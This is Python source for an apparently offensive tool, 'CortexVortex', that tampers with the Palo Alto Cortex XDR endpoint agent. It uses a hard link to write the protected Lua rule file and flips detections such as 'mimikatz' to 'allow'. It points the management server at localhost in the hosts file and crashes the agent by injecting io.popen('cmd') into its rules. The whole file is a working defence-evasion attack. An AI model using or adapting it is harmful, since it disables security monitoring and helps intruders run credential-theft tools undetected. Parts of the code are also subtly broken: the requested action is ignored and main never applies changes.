"""
This module provides utilities for Palo Alto Cortex XDR.

It includes:
    1. creating an hard link (without write permissions) to a target file.
    2. modify lua rules (based on the dse_rules_config.lua file)
    3. invoke a check-in operation which cause the XDR to load new rules.
    4. update cyserver policy rules localy (without connection to the managment server)
    5. get managment-server URL. 
"""

import argparse
import os
import re
import json
import random
import logging
import tempfile
import subprocess
import psutil
from time import sleep
from filesystem_link import create_hard_link

DSE_RULES_FILE = os.path.join(os.environ.get('programdata'),
                              r'Cyvera\LocalSystem\Download\content\dse_rules_config.lua')

HOSTS_FILE_PATH = os.path.join(os.environ.get('systemroot'), r'System32\drivers\etc\hosts')

PREVENTION_FOLDER_PATH = os.path.join(os.environ.get('programdata'), r'Cyvera\Prevention')

CYTOOL_PATH = os.path.join(os.environ.get('programfiles'), r'Palo Alto Networks\Traps\cytool')

MGMT_URL_FILE_1 = os.path.join(os.environ.get('programdata'),
                                r'Cyvera\LocalSystem\Data\db_backup\core_home_url.txt')

LOCALHOST = "127.0.0.1"
MGMT_URL_FILE_2 = "cloud_frontend.json"
ACTION_VALUES = ["allow", "block", "internal"]
ENABLED_OPTIONS = ["enable", "disable"]


def do_checkin():
    """
    Performs a check-in operation.

    This function initiates a check-in operation by invoking a command-line tool cytool.exe 
    The check-in operation causes cyserver to reload the rules from the Lua files.

    :return: The return code of the check-in operation.
    """

    # This is cause cyserver to load again the rules from the lua file.
    args = [CYTOOL_PATH, 'checkin']
    p = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return_code = p.wait()
    return return_code

def start_cyserver():
    """
    Starts the cyserver.exe process.

    This function starts the cyserver processby invoking a command-line tool cytool.exe 

    :return: The return code of the cytool runtime cyserver start.
    """

    # This is cause cyserver to load again the rules from the lua file.
    args = [CYTOOL_PATH, 'runtime', 'start', 'cyserver']
    p = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return_code = p.wait()
    return return_code

def get_management_url():
    """
    Retrieves the management server URL using two methods.

    This function attempts to retrieve the management server URL using two methods:
    1. Reads from a specified file (MGMT_URL_FILE_1).
    2. Searches for a specific file (MGMT_URL_FILE_2) in a 
    specified folder (MGMT_FOLDER_PATH) and extracts the URL from its contents.

    :return: The management server URL if found, otherwise None.
    """
    mgmt_url = None

    # Method 1 of getting the manegment server URL:
    try:
        with open(MGMT_URL_FILE_1, 'r', encoding='utf8') as mgmt_server_url_file:
            mgmt_url = mgmt_server_url_file.read()

        return mgmt_url

    except FileNotFoundError:
        logging.error("Managment file: %s was not found", MGMT_URL_FILE_1)



    # Method 2 of getting the manegment server URL:
    cloud_frontend_file = None

    for dirpath, _, filenames in os.walk(PREVENTION_FOLDER_PATH):
        if cloud_frontend_file is not None:
            break
        for filename in filenames:
            if filename == MGMT_URL_FILE_2:
                file_path = os.path.join(dirpath, filename)
                cloud_frontend_file = file_path
                break

    if cloud_frontend_file is None:
        logging.error("cloud_frontend file not found")
        logging.error("Failed to retrive MGMT URL")
        logging.error("Exiting")
        exit()

    with open(cloud_frontend_file, 'r', encoding='utf8') as json_file:
        file_data = json.load(json_file)
        try:
            mgmt_url = file_data['entries'][1]['value']['cloud_communication_data'] \
                ['home_server']['url']
            logging.info("Found MGMT URL: %s", mgmt_url)
        except KeyError as e:
            logging.error("Failed to retrive MGMT URL from cloud_frontend file")
            logging.error(e)
            logging.error("Exiting")
            exit()

    return mgmt_url

def modify_lua_config(lua_file_path, config_name, new_action):
    """
    Modifies the action of a Lua configuration in a specified file.

    This function modifies the action of a Lua configuration specified
    by `config_name` in the Lua file located at `lua_file_path`.
    It updates the action to `new_action` and writes the modified content back to the file.

    :param lua_file_path: The path to the Lua file.
    :param config_name: The name of the Lua configuration to modify.
    :param new_action: The new action to set for the configuration.
    """

    with open(lua_file_path, 'r', encoding='utf8') as file:
        lua_content = file.readlines()

    found_config = False
    config_lines_to_modify = []
    config_name_pattern = f'.*\\[".*?{config_name}.*"\\] = '
    action_pattern = r"action = \"(.+?)\""
    # Get all the lines that contains the given config_name
    for i, line in enumerate(lua_content):
        # Check if the current line contains the configuration name
        if re.match(config_name_pattern, line):
            found_config = True
            config_lines_to_modify.append(i)


    if found_config:
        # Write the modified Lua content back to the file
        for line_idx in config_lines_to_modify:
            action_idx = 0
            try:
                while not re.search(action_pattern, lua_content[line_idx + action_idx]):
                    action_idx+= 1
            except IndexError:
                logging.error("Out of index error when tried to look for action varaible")
                logging.error("Corrupted DSE file \\ Error parsing, discard changes")

            lua_content[line_idx+action_idx] = re.sub(action_pattern, 'action = "allow"',
                                                      lua_content[line_idx+action_idx])

        try:
            with open(lua_file_path, 'w', encoding='utf8') as file:
                file.write(''.join(lua_content))
        except PermissionError:
            logging.error("Failed to write to %s", lua_file_path)

        logging.info("Configuration '%s' action has been modified to '%s'", config_name, new_action)

    else:
        logging.warning("Configuration '%s' not found in the Lua file.", config_name)

def generate_temp_file():
    """
    Generates a temporary file name.
    :return: A string representing the path of the temporary file.
    """

    temp_name = tempfile.gettempdir() + f"\\dse_linked_tmp_{str(random.randint(0,10000))}"
    if os.path.exists(temp_name):
        os.remove(temp_name)
    return temp_name

def get_temp_hard_link(file_to_link):
    """
    Creates a temporary hard link to a specified file.
    :param file_to_link: The path of the file to create a hard link to.
    :return: A string representing the path of the linked file.
    """
    # TODO: check the return value of create_hard_link
    
    linked_dse_file = generate_temp_file()
    create_hard_link(file_to_link, linked_dse_file)
    logging.info("Successfully Hard linked %s <--> %s", linked_dse_file, file_to_link)
    return linked_dse_file

def add_entry_to_hosts(url_to_add):
    """
    Adds an entry to the hosts file if it doesn't already exist.
    :param url_to_add: The URL to be added to the hosts file.
    """

    try:
        with open(HOSTS_FILE_PATH, 'r', encoding='utf8') as file:
            lines = file.readlines()

        # Check if the URL is already in the hosts file
        if any(url_to_add in line for line in lines):
            logging.warning("The URL %s already exists in the hosts file.", url_to_add)
            return

        with open(HOSTS_FILE_PATH, 'a', encoding='utf8') as file:
            file.write(f"\n{LOCALHOST}\t{url_to_add}\n")

    except FileNotFoundError:
        logging.error("Hosts file not found.")
    except PermissionError:
        logging.error("Permission denied. Please run the script with appropriate permissions.")

def update_cyserver_policy():
    """
    Updates the CyServer policy without connection to the managment server.
    This will allow the cyserver.exe process to load new rules.
    """


    mgmt_url = get_management_url()
    if mgmt_url:
        logging.info("Found managment server URL: %s", mgmt_url)

    logging.info("Inserting managment URL to hosts file")
    add_entry_to_hosts(mgmt_url.replace("https://",""))

    logging.info("Initiating check-in (~10 seconds)")
    do_checkin()
    sleep(10)

def remove_entry_from_hosts(url_to_remove):
    """
    Removes an entry from the hosts file if it exists.
    :param url_to_remove: The URL to be removed from the hosts file.
    """

    try:
        with open(HOSTS_FILE_PATH, 'r', encoding='utf8') as file:
            hosts_lines = file.readlines()

        # Check if the URL is exists in the hosts file
        if all(not url_to_remove in line for line in hosts_lines):
            logging.warning("The URL %s not found in hosts file.", url_to_remove)
            return

        with open(HOSTS_FILE_PATH, 'w', encoding='utf8') as file:
            for line in hosts_lines:
                if url_to_remove not in line:
                    file.write(line)

    except FileNotFoundError:
        logging.error("Hosts file not found.")
    except PermissionError:
        logging.error("Permission denied. Please run the script with appropriate permissions.")

def modify_rules_and_update(linked_dse, rules_to_modify, new_action):
    """
    Modifies rules in the linked DSE and updates the cyserver.exe policy.

    This function modifies rules specified in `rules_to_modify` in the linked DSE file.
    Then it updates the CyServer policy.

    :param linked_dse: The linked DSE config file to modify rules in.
    :param rules_to_modify: A list of rules to modify.
    :param new_action: The new action to apply to the modified rules.
    """

    for rule in rules_to_modify:
        modify_lua_config(linked_dse, rule, new_action)

    logging.info("Rules modified sucussfully")
    update_cyserver_policy()

def is_cyserver_running():
    """
    Check if the process 'cyserver.exe' is running.

    Returns:
        bool: True if the process 'cyserver.exe' is running, False otherwise.
    """

    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == 'cyserver.exe':
            return True
    return False


def restart_cyserver():
    """
    Restart the cyserver process.

    This function performs the following steps:
    1. Creates a temporary hard link to the DSE_RULES_FILE.
    2. Appends exception raise code to the DSE_RULES_FILE.
    3. Updates the cyserver policy (this will cause cyserver to crash)
    4. Waits until the cyserver process crashed.
    5. Restores the original content of the DSE_RULES_FILE.
    6. Starts the cyserver process.
    """

    linked_dse = get_temp_hard_link(DSE_RULES_FILE)
    with open(linked_dse,'r+', encoding='utf8') as dse_file:
        original_lines = dse_file.read()
        dse_file.seek(0, 2)
        dse_file.write("\n--io.popen exception raise:\n")
        dse_file.write('io.popen("cmd")\n')

    update_cyserver_policy()
    while is_cyserver_running():
        sleep(1)

    with open(linked_dse, 'w', encoding='utf8') as file:
        file.write(original_lines)

    start_cyserver()
    os.remove(linked_dse)

def main():
    # TODO: implement as a Tool.
    parser = argparse.ArgumentParser(description="CortexVortex, a tool to change Cortex XDR configurations")

    parser.add_argument("config_file", default=DSE_RULES_FILE, help=f"Path to the LUA configuration file (default= {DSE_RULES_FILE}")
    parser.add_argument("config_name", help="Name of the configuration to change (e.g: mimikatz, rtcore64, lasagna)")
    parser.add_argument("new_value", help="New value for the configuration (allow, block, internal)", choices=ACTION_VALUES)
    parser.add_argument("--local_analysis", help="Option to enable/disable local analysis", choices=ENABLED_OPTIONS, default=None)
    parser.add_argument("--restart_XDR", help="Option to restart the XDR by crashing cyserver.exe")

    args = parser.parse_args()

    config_file = args.config_file
    config_name = args.config_name
    new_value = args.new_value

    if new_value not in ACTION_VALUES:
        print("Error: Invalid value for new_value. Allowed values are 'allow', 'block', 'internal'.")
        return

    # change_config(config_file, config_name, new_value)
    print("Configuration changed successfully.")


if __name__ == "__main__":
    main()
